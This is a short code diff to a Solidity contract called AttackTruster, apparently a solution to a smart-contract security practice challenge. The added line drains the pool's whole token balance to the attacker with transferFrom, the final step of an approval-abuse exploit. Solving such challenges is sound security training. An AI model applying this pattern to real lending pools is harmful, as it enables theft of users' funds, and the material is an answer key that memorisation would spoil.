@@ -25,6 +25,7 @@ contract AttackTruster {
             )
         );
 
+        require(token.transferFrom(address(pool), address(this), token.balanceOf(address(pool))));
 
     }
 }
